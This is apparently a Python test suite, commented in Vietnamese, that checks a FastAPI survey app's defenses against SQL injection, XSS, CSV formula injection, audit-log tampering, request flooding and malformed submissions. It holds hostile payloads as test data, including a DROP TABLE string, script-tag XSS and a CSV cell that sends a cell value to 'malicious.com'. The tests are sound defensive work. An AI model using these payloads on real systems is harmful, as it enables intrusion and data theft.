import csv
import io
import json
import uuid
import pytest
from datetime import datetime, timezone
from fastapi.testclient import TestClient
from app.main import app
from app.database import get_db, record_audit_log, verify_audit_chain

client = TestClient(app)

# ==============================================================================
# RED-TEAM SECURITY & INTEGRITY VERIFICATION SUITE (OWASP / SAIF / AAPOR)
# ==============================================================================

def test_sql_injection_defense_across_endpoints():
    """
    Thử nghiệm tấn công SQL Injection với các payload độc hại phổ biến
    trên các tham số đường dẫn (path params), query params và JSON body.
    Đảm bảo 100% truy vấn dùng parameterized query, không rò rỉ CSDL và không lỗi 500.
    """
    sqli_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE responses; --",
        "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        "' OR 1=1 --",
        "admin'--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7178706271,(SELECT (ELT(1=1,1))),0x7170707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--"
    ]

    for payload in sqli_payloads:
        # 1. Thử nghiệm trên GET /api/surveys/{survey_id}
        res1 = client.get(f"/api/surveys/{payload}")
        assert res1.status_code in (404, 422), f"SQLi payload '{payload}' gây lỗi không mong muốn trên get survey: {res1.status_code}"

        # 2. Thử nghiệm trên GET /api/surveys/{survey_id}/analytics
        res2 = client.get(f"/api/surveys/{payload}/analytics")
        assert res2.status_code in (404, 422), f"SQLi payload '{payload}' gây lỗi trên analytics: {res2.status_code}"

        # 3. Thử nghiệm trên GET /api/surveys/{survey_id}/audit-trail
        res3 = client.get(f"/api/surveys/{payload}/audit-trail")
        assert res3.status_code in (404, 422), f"SQLi payload '{payload}' gây lỗi trên audit-trail: {res3.status_code}"

        # 4. Thử nghiệm trên GET /api/surveys/{survey_id}/enumerators
        res4 = client.get(f"/api/surveys/{payload}/enumerators")
        assert res4.status_code in (404, 422), f"SQLi payload '{payload}' gây lỗi trên enumerators: {res4.status_code}"

        # 5. Thử nghiệm trên GET /api/surveys/{survey_id}/analytics/benford?question_id=...
        res5 = client.get(f"/api/surveys/test_survey/analytics/benford?question_id={payload}")
        assert res5.status_code in (404, 422, 200), f"SQLi payload '{payload}' gây lỗi trên benford: {res5.status_code}"
        assert res5.status_code != 500

    # Xác minh bảng responses và surveys vẫn toàn vẹn không bị drop hay thay đổi
    with get_db() as conn:
        tbl_check = conn.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='responses'").fetchone()
        assert tbl_check is not None, "Bảng responses đã bị xóa trái phép bởi SQL Injection!"

def test_xss_and_script_tag_neutralization():
    """
    Thử nghiệm tấn công XSS (Cross-Site Scripting) với thẻ script, event handlers (onload, onerror)
    trong tiêu đề, mô tả, nhãn câu hỏi và câu trả lời.
    """
    xss_payloads = [
        "<script>alert('XSS_ATTACK')</script>",
        "<img src=x onerror=alert('IMG_XSS')>",
        "<svg/onload=alert('SVG_XSS')>",
        "javascript:alert(1)"
    ]

    # Tạo khảo sát chứa XSS payload
    create_res = client.post("/api/surveys", json={
        "title": f"Survey {xss_payloads[0]}",
        "description": f"Description with {xss_payloads[1]}"
    })
    assert create_res.status_code == 201
    survey_data = create_res.json()
    survey_id = survey_data["id"]

    # Cập nhật câu hỏi chứa XSS
    up_res = client.put(f"/api/surveys/{survey_id}", json={
        "title": f"Safe Title {xss_payloads[2]}",
        "questions": [
            {
                "id": "q_xss_1",
                "question_type": "short_text",
                "title": f"Question {xss_payloads[3]}",
                "order_index": 0,
                "is_required": True,
                "options": [],
                "logic_rules": []
            }
        ]
    })
    assert up_res.status_code == 200

    # Lấy lại khảo sát và kiểm tra JSON response không bị vỡ định dạng
    get_res = client.get(f"/api/surveys/{survey_id}")
    assert get_res.status_code == 200
    retrieved = get_res.json()
    assert len(retrieved["questions"]) == 1
    # Dữ liệu được lưu trữ nguyên vẹn nhưng được trả về an toàn dưới dạng chuỗi JSON chuẩn
    assert xss_payloads[2] in retrieved["title"]

def test_csv_formula_injection_defense_deep():
    """
    Kiểm thử chuyên sâu chống tấn công CSV Formula Injection (CWE-1236)
    khi xuất báo cáo dữ liệu khảo sát và nhật ký OMR.
    Các ký tự nguy hiểm: =, +, -, @, \\t, \\r phải được vô hiệu hóa bằng dấu nháy đơn '.
    """
    dangerous_cells = [
        "=cmd|' /C calc'!A0",
        "=HYPERLINK(\"http://malicious.com?leak=\"&A1,\"Click me\")",
        "+123456-7890",
        "-SUM(A1:A50)",
        "@SUM(B1:B10)",
        "\tDANGEROUS_TAB",
        "\rDANGEROUS_CR"
    ]

    # Tạo khảo sát và xuất bản
    survey_id = f"s_csv_sec_{uuid.uuid4().hex[:6]}"
    slug = f"csv-sec-{uuid.uuid4().hex[:6]}"
    now_iso = datetime.now(timezone.utc).isoformat()

    with get_db() as conn:
        conn.execute("""
            INSERT INTO surveys (id, title, description, instructions, status, public_slug, version, created_at, updated_at)
            VALUES (?, 'CSV Injection Test Survey', 'Testing CWE-1236 Defense', '', 'published', ?, 1, ?, ?)
        """, (survey_id, slug, now_iso, now_iso))

        conn.execute("""
            INSERT INTO questions (id, survey_id, order_index, question_type, title, is_required, options_json, created_at)
            VALUES ('q_csv_1', ?, 0, 'short_text', 'Ý kiến phản hồi', 1, '[]', ?)
        """, (survey_id, now_iso))

        # Chèn câu trả lời chứa formula injection
        for idx, payload in enumerate(dangerous_cells):
            rid = f"r_csv_{idx}_{uuid.uuid4().hex[:6]}"
            conn.execute("""
                INSERT INTO responses (id, survey_id, survey_version, started_at, submitted_at, duration_seconds, analysis_status, review_status)
                VALUES (?, ?, 1, ?, ?, 45.0, 'analyzed', 'unverified')
            """, (rid, survey_id, now_iso, now_iso))

            conn.execute("""
                INSERT INTO response_answers (id, response_id, question_id, answer_value, created_at)
                VALUES (?, ?, 'q_csv_1', ?, ?)
            """, (f"ans_{rid}", rid, payload, now_iso))

    # Tải file CSV từ endpoint /api/surveys/{survey_id}/export?format=csv&scope=raw
    export_res = client.get(f"/api/surveys/{survey_id}/export?format=csv&scope=raw")
    assert export_res.status_code == 200
    csv_text = export_res.text

    # Đọc và phân tích CSV
    reader = csv.reader(io.StringIO(csv_text))
    rows = list(reader)
    assert len(rows) >= len(dangerous_cells) + 1  # Header + data rows

    # Xác minh không có ô nào bắt đầu bằng =, +, -, @ mà không có dấu nháy đơn '
    for row in rows[1:]:
        # Cột câu trả lời là cột cuối cùng
        answer_cell = row[-1]
        for d in dangerous_cells:
            if d.strip() in answer_cell:
                # Phải được bọc bằng ký tự '
                assert answer_cell.startswith("'"), f"Cell '{answer_cell}' chưa được vô hiệu hóa an toàn chống CSV Injection!"

def test_tamper_evident_cryptographic_verification_deep():
    """
    Kiểm thử khả năng tự phát hiện can thiệp dữ liệu bất hợp pháp (Cryptographic Anti-Tamper)
    của chuỗi băm SHA-256 (Audit Hash Chain).
    1. Kiểm tra chuỗi nguyên vẹn ban đầu.
    2. Tấn công can thiệp trực tiếp vào 1 dòng trong CSDL SQLite.
    3. Kiểm tra verify_audit_chain phát hiện chính xác vị trí và loại vi phạm.
    """
    survey_id = f"s_tamper_{uuid.uuid4().hex[:6]}"
    now_iso = datetime.now(timezone.utc).isoformat()

    with get_db() as conn:
        # Ghi 3 log kiểm toán tuần tự
        record_audit_log(conn, "survey", survey_id, "CREATE", {"step": 1})
        record_audit_log(conn, "survey", survey_id, "UPDATE", {"step": 2})
        record_audit_log(conn, "survey", survey_id, "PUBLISH", {"step": 3})

        # 1. Kiểm tra chuỗi hợp lệ 100%
        valid_res = verify_audit_chain(conn)
        assert valid_res["is_valid"] is True
        assert valid_res["total_records"] >= 3

        # Lấy dòng thứ 2 liên quan đến survey này
        row2 = conn.execute("""
            SELECT rowid, id, details_json, entry_hash FROM audit_logs 
            WHERE entity_id = ? AND action = 'UPDATE'
        """, (survey_id,)).fetchone()
        assert row2 is not None
        row2_id = row2[0]

        # 2. Thực hiện tấn công ngụy tạo: Thay đổi nội dung payload nhưng không biết khóa băm
        conn.execute("""
            UPDATE audit_logs 
            SET details_json = '{"step": 2, "hacked": true}' 
            WHERE rowid = ?
        """, (row2_id,))

        # 3. Chạy xác thực lại chuỗi băm
        tampered_res = verify_audit_chain(conn)
        assert tampered_res["is_valid"] is False
        assert tampered_res["error_type"] in ("SIGNATURE_PAYLOAD_TAMPERED", "PREV_HASH_CHAIN_BROKEN")
        assert tampered_res["tampered_record_id"] == row2[1]

        # 4. Khôi phục lại dữ liệu ban đầu để bảo toàn tính toàn vẹn chuỗi cho các tiến trình khác
        conn.execute("UPDATE audit_logs SET details_json = ? WHERE rowid = ?", (row2[2], row2_id))
        restored_res = verify_audit_chain(conn)
        assert restored_res["is_valid"] is True

def test_rate_limiter_and_flood_burst_protection():
    """
    Kiểm thử cơ chế phòng thủ từ chối dịch vụ (Rate Limiting) trên các endpoint nhạy cảm:
    - /api/ai/generate-survey (tối đa 20 requests / 60 giây)
    """
    triggered_429 = False

    for _ in range(25):
        res = client.post(
            "/api/ai/generate-survey",
            json={
                "topic": "Flood Test Topic",
                "audience": "Bots",
                "expected_time_minutes": 5
            },
            headers={"X-Test-Rate-Limit": "1"}
        )
        if res.status_code == 429:
            triggered_429 = True
            assert "giới hạn an toàn" in res.json().get("detail", "").lower()
            break

    assert triggered_429 is True, "Hệ thống không kích hoạt mã phản hồi 429 khi bị gửi dồn dập vượt ngưỡng Rate Limit!"

def test_adversarial_malformed_survey_submission():
    """
    Kiểm thử gửi dữ liệu phản hồi khảo sát công khai bị dị dạng / độc hại:
    1. Câu hỏi bắt buộc (is_required=True) bị bỏ trống -> 422 validation_errors.
    2. Câu trả lời text vượt quá 10,000 ký tự (DoS Buffer Overflow Attempt) -> 422 validation_errors.
    3. Missing started_at / submitted_at schema validation -> 422.
    """
    survey_id = f"s_mal_{uuid.uuid4().hex[:6]}"
    slug = f"mal-slug-{uuid.uuid4().hex[:6]}"
    now_iso = datetime.now(timezone.utc).isoformat()

    with get_db() as conn:
        conn.execute("""
            INSERT INTO surveys (id, title, description, instructions, status, public_slug, version, created_at, updated_at)
            VALUES (?, 'Malformed Submission Test', '', '', 'published', ?, 1, ?, ?)
        """, (survey_id, slug, now_iso, now_iso))

        conn.execute("""
            INSERT INTO questions (id, survey_id, order_index, question_type, title, is_required, options_json, created_at)
            VALUES ('q_req_1', ?, 0, 'single_choice', 'Câu hỏi bắt buộc', 1, ?, ?)
        """, (survey_id, json.dumps([{"id": "o1", "label": "A"}]), now_iso))

        conn.execute("""
            INSERT INTO questions (id, survey_id, order_index, question_type, title, is_required, options_json, created_at)
            VALUES ('q_text_1', ?, 1, 'short_text', 'Ý kiến đóng góp', 0, '[]', ?)
        """, (survey_id, now_iso))

    # 1. Gửi thiếu câu hỏi bắt buộc (q_req_1)
    res_missing = client.post(f"/api/public/surveys/{slug}/submit", json={
        "started_at": now_iso,
        "submitted_at": now_iso,
        "answers": {},
        "client_metadata": {"device": "test"}
    })
    assert res_missing.status_code == 422
    err_detail = str(res_missing.json().get("detail", {}))
    assert "chưa có câu trả lời" in err_detail

    # 2. Gửi chuỗi văn bản khổng lồ (> 10,000 ký tự) nhằm gây tràn bộ nhớ / DoS
    huge_text = "A" * 12000
    res_overflow = client.post(f"/api/public/surveys/{slug}/submit", json={
        "started_at": now_iso,
        "submitted_at": now_iso,
        "answers": {"q_req_1": "o1", "q_text_1": huge_text},
        "client_metadata": {"device": "test"}
    })
    assert res_overflow.status_code == 422
    err_overflow = str(res_overflow.json().get("detail", {}))
    assert "vượt quá độ dài tối đa" in err_overflow
